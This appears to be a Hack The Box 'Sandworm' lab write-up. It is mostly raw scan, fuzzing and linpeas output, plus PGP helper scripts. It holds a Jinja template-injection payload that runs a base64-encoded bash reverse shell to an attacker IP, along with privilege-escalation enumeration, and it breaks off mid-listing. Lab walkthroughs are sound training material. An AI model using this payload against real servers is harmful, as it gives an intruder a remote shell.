# 【Hack The Box】Sandworm【Writeup】

> 原文: https://www.ctfiot.com/146323.html
> ID: 146323


```
┌──(root㉿kali)-[~]
└─# rustscan -a 10.129.34.190 --top --ulimit 5000
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.34.190:22
Open 10.129.34.190:80
Open 10.129.34.190:
443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 08:02 EDT
Initiating Ping Scan at 08:02
Scanning 10.129.34.190 [4 ports]
Completed Ping Scan at 08:02, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:02
Completed Parallel DNS resolution of 1 host. at 08:02, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:02
Scanning 10.129.34.190 [3 ports]
Discovered open port 22/tcp on 10.129.34.190
Discovered open port 80/tcp on 10.129.34.190
Discovered open port 443/tcp on 10.129.34.190
Completed SYN Stealth Scan at 08:02, 0.30s elapsed (3 total ports)
Nmap scan report for 10.129.34.190
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2023-06-19 08:02:25 EDT for 1s

PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
443/tcp open https syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
 Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
┌──(root💀kali)-[~/work]
└─# vim /etc/hosts
10.129.34.190 ssa.htb
┌──(root㉿kali)-[~]
└─# ping ssa.htb
PING ssa.htb (10.129.34.190) 56(84) bytes of data.
64 bytes from ssa.htb (10.129.34.190): icmp_seq=1 ttl=63 time=261 ms
64 bytes from ssa.htb (10.129.34.190): icmp_seq=2 ttl=63 time=253 ms
64 bytes from ssa.htb (10.129.34.190): icmp_seq=3 ttl=63 time=253 ms
^C
--- ssa.htb ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 252.597/255.634/260.867/3.715 ms
┌──(root㉿kali)-[~/work]
└─# dirsearch -u https://ssa.htb/

 _|. _ _ _ _ _ _|_ v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/ssa.htb/-_23-06-19_08-08-19.txt

Error Log: /root/.dirsearch/logs/errors-23-06-19_08-08-19.log

Target: https://ssa.htb/

[08:08:20] Starting:
[08:09:05] 200 - 5KB - /about
[08:09:11] 302 - 227B - /admin -> /login?next=%2Fadmin
[08:10:05] 200 - 3KB - /contact
[08:10:38] 200 - 9KB - /guide
[08:11:00] 200 - 4KB - /login
[08:11:02] 302 - 229B - /logout -> /login?next=%2Flogout
┌──(root㉿kali)-[~/work]
└─# ffuf -w directory-list-2.3-small.txt:
FUZZ -u https://ssa.htb/FUZZ -t 150

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.0.0-dev
________________________________________________

 :: Method : GET
 :: URL : https://ssa.htb/FUZZ
 :: Wordlist : FUZZ: /root/work/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 150
 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 262ms]
 * FUZZ: # directory-list-2.3-small.txt

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 259ms]
 * FUZZ: # Attribution-Share Alike 3.0 License. To view a copy of this

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 265ms]
 * FUZZ: #

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 269ms]
 * FUZZ: # Priority-ordered case-sensitive list, where entries were found

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 270ms]
 * FUZZ:

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 270ms]
 * FUZZ: # or send a letter to Creative Commons, 171 Second Street,

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 270ms]
 * FUZZ: # license, visit http://creativecommons.org/licenses/by-sa/3.0/

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 275ms]
 * FUZZ: # This work is licensed under the Creative Commons

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 271ms]
 * FUZZ: # Suite 300, San Francisco, California, 94105, USA.

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 276ms]
 * FUZZ: # on at least 3 different hosts

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 281ms]
 * FUZZ: #

[Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 269ms]
 * FUZZ: about

[Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 310ms]
 * FUZZ: login

[Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 318ms]
 * FUZZ: contact

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 331ms]
 * FUZZ: #

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 343ms]
 * FUZZ: # Copyright 2007 James Fisher

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 337ms]
 * FUZZ: #

[Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 355ms]
 * FUZZ: view

[Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 276ms]
 * FUZZ: admin

[Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 270ms]
 * FUZZ: guide

[Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 266ms]
 * FUZZ: pgp

[Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 270ms]
 * FUZZ: logout

[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 345ms]
 * FUZZ: process

[Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 430ms]
 * FUZZ:

:: Progress: [87664/87664] :: Job [1/1] :: 307 req/sec :: Duration: [0:04:48] :: Errors: 0 ::
import argparse
import gnupg

def generate_keypair(gpg, name, email, passphrase):
 input_data = gpg.gen_key_input(
 key_type="RSA",
 key_length=2048,
 name_real=name,
 name_email=email,
 passphrase=passphrase
 )
 key = gpg.gen_key(input_data)
 return key

def save_keys(gpg, public_key_file, private_key_file, key, passphrase):
 public_key = gpg.export_keys(key.fingerprint)
 private_key = gpg.export_keys(key.fingerprint, secret=True, passphrase=passphrase)

 with open(public_key_file, "w") as f:
 f.write(public_key)

 with open(private_key_file, "w") as f:
 f.write(private_key)

def main():
 parser = argparse.ArgumentParser(description="PGP key pair generator")
 parser.add_argument("-n", "--name", dest="name", type=str, required=True, help="Name for the key owner")
 parser.add_argument("-e", "--email", dest="email", type=str, required=True, help="Email address for the key owner")
 parser.add_argument("-p", "--passphrase", dest="passphrase", type=str, required=True, help="Passphrase to protect the private key")
 parser.add_argument("--public-key-file", default="public_key.asc", help="Output file for the public key")
 parser.add_argument("--private-key-file", default="private_key.asc", help="Output file for the private key")
 args = parser.parse_args()

 gpg = gnupg.GPG()
 key = generate_keypair(gpg, args.name, args.email, args.passphrase)
 save_keys(gpg, args.public_key_file, args.private_key_file, key, args.passphrase)

 print("Key pair generated successfully!")
 print(f"Public key saved to: {args.public_key_file}")
 print(f"Private key saved to: {args.private_key_file}")

if __name__ == "__main__":
 main()
import argparse
import gnupg

def sign_message(message, private_key_file, passphrase):
 gpg = gnupg.GPG()
 with open(private_key_file, "r") as f:
 key_data = f.read()
 import_result = gpg.import_keys(key_data)

 private_key = import_result.results[0]['fingerprint']

 signed_data = gpg.sign(message, keyid=private_key, passphrase=passphrase)
 return signed_data

def main():
 parser = argparse.ArgumentParser(description="PGP message signer")
 parser.add_argument("-m", "--message", type=str, required=True, help="Message to sign")
 parser.add_argument("-r", "--private-key-file", type=str, required=True, help="Private key file")
 parser.add_argument("-p", "--passphrase", type=str, required=True, help="Passphrase for the private key")
 args = parser.parse_args()

 message = args.message
 private_key_file = args.private_key_file
 passphrase = args.passphrase

 signed_data = sign_message(message, private_key_file, passphrase)

 if signed_data.status == "signature created":
 print("Message signed successfully!")
 print("Signed message:")
 print(signed_data.data.decode('utf-8'))
 else:
 print("Failed to sign the message. Error message:")
 print(signed_data.status)

if __name__ == "__main__":
 main()
#!/bin/bash
# Please run with arg1st is string. exp: ./sandworm "test"

python3 keygen.py -n "taksec" -e "$1" -p aaa --public-key-file public.pem --private-key-file private.pem
python3 sign.py -m "test taksec message" --private-key-file private.pem -p aaa
cat public.pem
┌──(root💀kali)-[~/work]
└─# nc -lnvp 4444
listening on [any] 4444 ...
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash').read() }}
python3 -c "import glob; print([p for p in glob.glob('/home/atlas/.*/**/*', recursive=True)])"
atlas@sandworm:~$ python3 -c "import glob; print([p for p in glob.glob('/home/atlas/.*/**/*admin*', recursive=True)])"
<lob('/home/atlas/.*/**/*admin*', recursive=True)])"
['/home/atlas/.config/httpie/sessions/localhost_5000/admin.json']
atlas@sandworm:~$
silentobserver@sandworm:~$ sudo -l
[sudo] password for silentobserver:
Sorry, user silentobserver may not run sudo on localhost.
silentobserver@sandworm:~$
┌──(root㉿kali)-[~/work]
└─# wget https://github.com/carlospolop/PEASS-ng/releases/download/20230312/linpeas.sh
silentobserver@sandworm:/tmp$ chmod +x linpeas.sh
silentobserver@sandworm:/tmp$ ./linpeas.sh

 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄
 ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
 ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄
 ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄
 ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄
 ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄
 ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄
 ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄
 ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄
 ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄
 ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄
 ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 ▀▀▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
 ▀▀▀▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▀▀
 ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

 /---------------------------------------------------------------------------------\
 | Do you like PEASS? |
 |---------------------------------------------------------------------------------|
 | Get the latest version : https://github.com/sponsors/carlospolop |
 | Follow on Twitter : @hacktricks_live |
 | Respect on HTB : SirBroccoli |
 |---------------------------------------------------------------------------------|
 | Thank you! |
 \---------------------------------------------------------------------------------/
 linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission. '
...省略

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=112(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=113(fwupd-refresh) gid=118(fwupd-refresh) groups=118(fwupd-refresh)
uid=114(mysql) gid=120(mysql) groups=120(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=997(_laurel) gid=997(_laurel) groups=997(_laurel)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

...省略

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25 2020 /etc/skel/.bashrc
-rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 /home/atlas/.bashrc
-rw-r--r-- 1 silentobserver silentobserver 3771 Nov 22 2022 /home/silentobserver/.bashrc

-rw-r--r-- 1 root root 807 Feb 25 2020 /etc/skel/.profile
-rw-r--r-- 1 atlas atlas 807 Nov 22 2022 /home/atlas/.profile
-rw-r--r-- 1 silentobserver silentobserver 807 Nov 22 2022 /home/silentobserver/.profile
-rw-r--r-- 1 root root 713 Nov 29 2022 /usr/local/etc/firejail/1password.profile
-rw-r--r-- 1 root root 1265 Nov 29 2022 /usr/local/etc/firejail/gnome-passwordsafe.profile

 ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
 ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsrwxr-x 2 atlas atlas 57M Jun 6 10:00 /opt/tipnet/target/debug/tipnet (Unknown SUID binary!)
-rwsrwxr-x 1 atlas atlas 54M May 4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 (Unknown SUID binary!)
-rwsrwxr-x 2 atlas atlas 57M Jun 6 10:00 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 (Unknown SUID binary!)
-rwsr-x--- 1 root jailer 1.7M Nov 29 2022 /usr/local/bin/firejail (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 35K Oct 25 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 331K Nov 23 2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Feb 26 2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 47K Feb 21 2022 /usr/bin/mount ---> Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 227K Apr 3 18:00 /usr/bin/sudo ---> check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 71K Nov 24 2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35K Feb 21 2022 /usr/bin/umount ---> BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 59K Nov 24 2022 /usr/bin/passwd ---> Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Nov 24 2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 72K Nov 24 2022 /usr/bin/chfn ---> SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Nov 24 2022 /usr/bin/newgrp ---> HP-UX_10.20
-rwsr-xr-x 1 root root 55K Feb 21 2022 /usr/bin/su
-rwsr-xr-x 1 root root 35K Mar 23 2022 /usr/bin/fusermount3

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 23K Feb 2 09:21 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 27K Feb 2 09:21 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Mar 24 2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 23K Feb 21 2022 /usr/bin/wall
-rwxr-sr-x 1 root _ssh 287K Nov 23 2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Nov 24 2022 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K Nov 24 2022 /usr/bin/chage
-rwxr-sr-x 1 root crontab 39K Mar 23 2022 /usr/bin/crontab
-rwxr-sr-x 1 root tty 23K Feb 21 2022 /usr/bin/write.ul (Unknown SGID binary)

...省略

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
 Group silentobserver:
/opt/crates/logger/.git
/opt/crates/logger/.git/config
/opt/crates/logger/.git/description
/opt/crates/logger/.git/HEAD
/opt/crates/logger/.git/info/exclude
/opt/crates/logger/.git/hooks/update.sample
/opt/crates/logger/.git/hooks/post-update.sample
/opt/crates/logger/.git/hooks/fsmonitor-watchman.sample
/opt/crates/logger/.git/hooks/pre-rebase.sample
/opt/crates/logger/.git/hooks/pre-merge-commit.sample
#)You_can_write_even_more_files_inside_last_directory

/opt/crates/logger/.git/objects
/opt/crates/logger/.git/objects/info
/opt/crates/logger/.git/objects/pack
/opt/crates/logger/.git/refs
/opt/crates/logger/.git/refs/heads
/opt/crates/logger/.git/refs/tags
/opt/crates/logger/.gitignore
/opt/crates/logger/target
/opt/crates/logger/target/CACHEDIR.TAG
/opt/crates/logger/target/.rustc_info.json
/opt/crates/logger/target/debug
/opt/crates/logger/target/debug/liblogger.d
/opt/crates/logger/target/debug/.cargo-lock
/opt/crates/logger/target/debug/.fingerprint
/opt/crates/logger/target/debug/.fingerprint/iana-time-zone-7aac1b520ad2eb1f
/opt/crates/logger/target/debug/.fingerprint/iana-time-zone-7aac1b520ad2eb1f/lib-iana-time-zone.json
/opt/crates/logger/target/debug/.fingerprint/iana-time-zone-7aac1b520ad2eb1f/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/iana-time-zone-7aac1b520ad2eb1f/dep-lib-iana-time-zone
/opt/crates/logger/target/debug/.fingerprint/iana-time-zone-7aac1b520ad2eb1f/lib-iana-time-zone
/opt/crates/logger/target/debug/.fingerprint/libc-e8e4fbca97cf3b0d
/opt/crates/logger/target/debug/.fingerprint/libc-e8e4fbca97cf3b0d/dep-build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/libc-e8e4fbca97cf3b0d/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/libc-e8e4fbca97cf3b0d/build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/libc-e8e4fbca97cf3b0d/build-script-build-script-build.json
/opt/crates/logger/target/debug/.fingerprint/libc-c54205ffac66e97a
/opt/crates/logger/target/debug/.fingerprint/libc-c54205ffac66e97a/dep-lib-libc
/opt/crates/logger/target/debug/.fingerprint/libc-c54205ffac66e97a/lib-libc.json
/opt/crates/logger/target/debug/.fingerprint/libc-c54205ffac66e97a/lib-libc
/opt/crates/logger/target/debug/.fingerprint/libc-c54205ffac66e97a/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/logger-d0ec122b4978c5b5
/opt/crates/logger/target/debug/.fingerprint/logger-d0ec122b4978c5b5/dep-lib-logger
/opt/crates/logger/target/debug/.fingerprint/logger-d0ec122b4978c5b5/lib-logger
/opt/crates/logger/target/debug/.fingerprint/logger-d0ec122b4978c5b5/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/logger-d0ec122b4978c5b5/lib-logger.json
/opt/crates/logger/target/debug/.fingerprint/chrono-0f6e387a37547029
/opt/crates/logger/target/debug/.fingerprint/chrono-0f6e387a37547029/dep-lib-chrono
/opt/crates/logger/target/debug/.fingerprint/chrono-0f6e387a37547029/lib-chrono.json
/opt/crates/logger/target/debug/.fingerprint/chrono-0f6e387a37547029/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/chrono-0f6e387a37547029/lib-chrono
/opt/crates/logger/target/debug/.fingerprint/autocfg-072a15be3dca763c
/opt/crates/logger/target/debug/.fingerprint/autocfg-072a15be3dca763c/lib-autocfg.json
/opt/crates/logger/target/debug/.fingerprint/autocfg-072a15be3dca763c/lib-autocfg
/opt/crates/logger/target/debug/.fingerprint/autocfg-072a15be3dca763c/dep-lib-autocfg
/opt/crates/logger/target/debug/.fingerprint/autocfg-072a15be3dca763c/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/num-integer-a2045520f7fb6700
/opt/crates/logger/target/debug/.fingerprint/num-integer-a2045520f7fb6700/lib-num-integer
/opt/crates/logger/target/debug/.fingerprint/num-integer-a2045520f7fb6700/lib-num-integer.json
/opt/crates/logger/target/debug/.fingerprint/num-integer-a2045520f7fb6700/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/num-integer-a2045520f7fb6700/dep-lib-num-integer
/opt/crates/logger/target/debug/.fingerprint/num-integer-741b6676734793e3
/opt/crates/logger/target/debug/.fingerprint/num-integer-741b6676734793e3/dep-build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/num-integer-741b6676734793e3/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/num-integer-741b6676734793e3/build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/num-integer-741b6676734793e3/build-script-build-script-build.json
/opt/crates/logger/target/debug/.fingerprint/num-traits-42542d5853acec68
/opt/crates/logger/target/debug/.fingerprint/num-traits-42542d5853acec68/lib-num-traits
/opt/crates/logger/target/debug/.fingerprint/num-traits-42542d5853acec68/lib-num-traits.json
/opt/crates/logger/target/debug/.fingerprint/num-traits-42542d5853acec68/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/num-traits-42542d5853acec68/dep-lib-num-traits
/opt/crates/logger/target/debug/.fingerprint/num-integer-5fcd1eb1caf5030a
/opt/crates/logger/target/debug/.fingerprint/num-integer-5fcd1eb1caf5030a/run-build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/num-integer-5fcd1eb1caf5030a/run-build-script-build-script-build.json
/opt/crates/logger/target/debug/.fingerprint/logger-5690f2601dcb9cf3
/opt/crates/logger/target/debug/.fingerprint/logger-5690f2601dcb9cf3/dep-lib-logger
/opt/crates/logger/target/debug/.fingerprint/logger-5690f2601dcb9cf3/lib-logger
/opt/crates/logger/target/debug/.fingerprint/logger-5690f2601dcb9cf3/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/logger-5690f2601dcb9cf3/lib-logger.json
/opt/crates/logger/target/debug/.fingerprint/num-traits-09ce1320563f1729
/opt/crates/logger/target/debug/.fingerprint/num-traits-09ce1320563f1729/run-build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/num-traits-09ce1320563f1729/run-build-script-build-script-build.json
/opt/crates/logger/target/debug/.fingerprint/libc-85bfbc0004d699f9
/opt/crates/logger/target/debug/.fingerprint/libc-85bfbc0004d699f9/run-build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/libc-85bfbc0004d699f9/run-build-script-build-script-build.json
/opt/crates/logger/target/debug/.fingerprint/time-9436ff2a3ed7b95b
/opt/crates/logger/target/debug/.fingerprint/time-9436ff2a3ed7b95b/dep-lib-time
/opt/crates/logger/target/debug/.fingerprint/time-9436ff2a3ed7b95b/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/time-9436ff2a3ed7b95b/lib-time
/opt/crates/logger/target/debug/.fingerprint/time-9436ff2a3ed7b95b/lib-time.json
/opt/crates/logger/target/debug/.fingerprint/num-traits-054271c35184efb6
/opt/crates/logger/target/debug/.fingerprint/num-traits-054271c35184efb6/dep-build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/num-traits-054271c35184efb6/invoked.timestamp
/opt/crates/logger/target/debug/.fingerprint/num-traits-054271c35184efb6/build-script-build-script-build
/opt/crates/logger/target/debug/.fingerprint/num-traits-054271c35184efb6/build-script-build-script-build.json
/opt/crates/logger/target/debug/build
/opt/crates/logger/target/debug/build/libc-e8e4fbca97cf3b0d
/opt/crates/logger/target/debug/build/libc-e8e4fbca97cf3b0d/build_script_build-e8e4fbca97cf3b0d.d
/opt/crates/logger/target/debug/build/libc-e8e4fbca97cf3b0d/build_script_build-e8e4fbca97cf3b0d
/opt/crates/logger/target/debug/build/libc-e8e4fbca97cf3b0d/build-script-build
/opt/crates/logger/target/debug/build/num-integer-741b6676734793e3
/opt/crates/logger/target/debug/build/num-integer-741b6676734793e3/build-script-build
/opt/crates/logger/target/debug/build/num-integer-741b6676734793e3/build_script_build-741b6676734793e3.d
/opt/crates/logger/target/debug/build/num-integer-741b6676734793e3/build_script_build-741b6676734793e3
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/stderr
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/invoked.timestamp
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/out
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/out/probe1.ll
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/out/probe0.ll
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/root-output
/opt/crates/logger/target/debug/build/num-integer-5fcd1eb1caf5030a/output
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/stderr
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/invoked.timestamp
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/out
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/out/probe5.ll
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/out/probe2.ll
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/out/probe3.ll
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/out/probe1.ll
/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/out/probe0.ll
#)You_can_write_even_more_files_inside_last_directory

/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/root-output
